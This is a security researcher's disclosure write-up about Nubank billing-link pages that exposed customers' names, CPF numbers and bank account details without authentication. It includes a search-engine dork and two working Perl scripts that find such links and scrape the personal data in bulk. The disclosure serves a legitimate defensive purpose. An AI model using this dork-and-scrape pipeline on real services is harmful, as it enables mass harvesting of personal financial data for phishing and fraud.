---
layout: content
title: 'A little case about scraping personal data exposure in the web'
description: 'During casual usage and routine security testing of applications installed on a personal device, a feature in the Nubank app was discovered that allows users to generate and share "billing links." While useful, the implementation of this feature presented a data exposure risk. A proof of concept (PoC) demonstrated that it was possible to collect personal data (CPF, full name, account number, and agency) of over 100 customers through automated scraping techniques.'
og_image: https://heitorgouvea.me/images/publications/nubank-scraping/google-dorks.png
---

Table of contents:
- [Summary](#summary)
- [Description](#description)
- [Prooft of Concept](#proof-of-concept)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [References](#references)

---

### Summary

During routine analysis and informal security testing of mobile applications, a feature in the Nubank app was identified that enables users to generate and share "billing links" with others. While the feature serves its intended purpose, its design raised concerns about potential misuse and data exposure. A proof of concept was developed to assess the extent of this exposure, revealing that sensitive personal information — including CPF, full name, bank account number, and agency — could be extracted from publicly accessible billing URLs. Over 100 customer records were mapped using basic automation in a matter of minutes.

*Disclaimer:* The responsible company was informed of all the details contained in this publication as quickly as possible. It  responded ethically and transparently, demonstrating appropriate attention and commitment. No systems were breached or compromised during testing. Additionaly, the company implemented some of the necessary changes to reduce the risk of misuse as described in this publication. Further recommendations to mitigate the vulnerabilities were provided, though the company did not deem them necessary to implement.

This publication is also available in: [Portuguese](/2020/06/23/Scraping-dados-pessoais-na-web) and [Spanish](/2020/06/23/caso-de-scraping-de-datos-personales).

---

### Description

The Nubank mobile application includes a feature called “Cobrar” (or “Charge”), which allows users to generate a payment request. Once an amount is optionally entered and the request is confirmed, a QR Code is created along with a corresponding URL. This URL can be shared directly through messaging platforms such as WhatsApp:

![](/images/publications/nubank-scraping/creating-a-link.png)

![](/images/publications/nubank-scraping/whatsapp-shared-link.png)

The QR Code encodes the same information as the URL, which, when accessed via a browser, reveals a summary of the payment request. Crucially, the page also displays personally identifiable information (PII) of the user who generated the link — including their full name, CPF (Brazilian national ID number), bank agency, and account number — without requiring authentication or any form of access control:

![](/images/publications/nubank-scraping/personal-infos.png)

These URLs are entirely user-generated and shared at the user’s discretion. However, the lack of protection over the content meant they were accessible to anyone with the link. [1]

Further investigation revealed that many of these links had been indexed by search engines. A simple crafted query (Google Dork) [2] — targeting URLs with the `/pagar/` pattern on Nubank’s domain — returned numerous publicly accessible billing pages:

```text
site:nubank.com.br inurl:/pagar/ -blog
```

![](/images/publications/nubank-scraping/google-dorks.png)

Beyond search engine indexing, several of these URLs were also being actively shared on public platforms such as Twitter, where users appeared to use the feature for receiving donations or conducting informal transactions:

![](/images/publications/nubank-scraping/twitter-links.png)

These findings indicated a broader exposure surface — not limited to search engines, but also extending to social media and other public channels where sensitive financial metadata was being inadvertently disclosed.

---

### Proof of Concept

To evaluate the real-world impact of this exposure, a proof of concept (PoC) was developed to demonstrate how sensitive information could be collected at scale from publicly accessible URLs.

The first step involved identifying as many valid billing URLs as possible. A simple script was written to query a search engine programmatically using a crafted dork [3], extract result links, and filter for relevant matches. The script iterates through multiple result pages, collecting unique URLs pointing to Nubank's payment endpoints:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use WWW::Mechanize;
use Mojo::Util qw(url_escape);

sub main {
    my $dork = $ARGV[0];

    if ($dork) {
        $dork = url_escape($dork);

        my %seen  = ();
        my $mech = WWW::Mechanize -> new();

        $mech -> ssl_opts (verify_hostname => 0);

        for my $page (0 .. 10) {
            my $url = "https://wwww.bing.com/search?q=${dork}&first=${page}0";

            $mech -> get($url);

            my @links = $mech -> links();

            foreach my $link (@links) {
                $url = $link -> url();

                next if $seen{$url}++;

                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
                    print $url, "\n";
                }
            }
        }
    }
}

exit main();
```

Using this approach, 100 valid billing URLs were collected. This limit was set intentionally to contain the scope of the demonstration:

![](/images/publications/nubank-scraping/file-with-the-urls.png)

A second script was then used to access each URL, parse the HTML response, and extract the personal information displayed on the page. This included full name, CPF, bank, account number, and agency:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use Mojo::DOM;
use Mojo::UserAgent;

binmode(STDOUT, ":encoding(UTF-8)");

sub main {
    my $urls_file = $ARGV[0];

    if ($urls_file) {
        my $userAgent = Mojo::UserAgent -> new (
            agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        );
        
        open my $urls_filehandle, "<", $urls_file or die $!;

        while (<$urls_filehandle>) {
            chomp ($_);
            
            my $request = $userAgent -> get($_) -> result();

            if ($request -> is_success()) {
                my $account = $request -> dom -> find("tr td") -> map("text") -> join(",");

                $account =~ s/Nome,//
                && $account =~ s/CPF,//
                && $account =~ s/Banco,//
                && $account =~ s/Tipo da conta,//
                && $account =~ s/Agência,//
                && $account =~ s/Conta,//
                && $account =~ s/Agência Métodos,//;

                say $account;
            }
        }

        close ($urls_filehandle);
    }
}

exit main();
```

The output confirmed that sensitive user data could be harvested in bulk from these links:

![](/images/publications/nubank-scraping/collect-with-names-cpfs.png)

In total, full names, CPF numbers, bank account numbers, and branch details for over 100 individuals were collected using basic automation within minutes. This result demonstrates how a seemingly helpful feature become a significant privacy concern when left unprotected and indexable by search engines.

---

### Impact

The ability to access sensitive user data via public URLs — without authentication or authorization — presents a serious security risk. These exposed details could be exploited for social engineering or spear phishing campaigns, significantly increasing the vulnerability of affected individuals.

---

### Conclusion

This analysis demonstrates how attackers could automate the discovery of Nubank billing URLs and extract personal data at scale. While this proof of concept relied on search engines, similar outcomes could be achieved by monitoring social media and other public forums. Such exposure puts users at increased risk of privacy violations and targeted fraud.

---

### References

- [1] [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
- [2] [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)
- [3] [https://en.wikipedia.org/wiki/Web_scraping](https://en.wikipedia.org/wiki/Web_scraping)
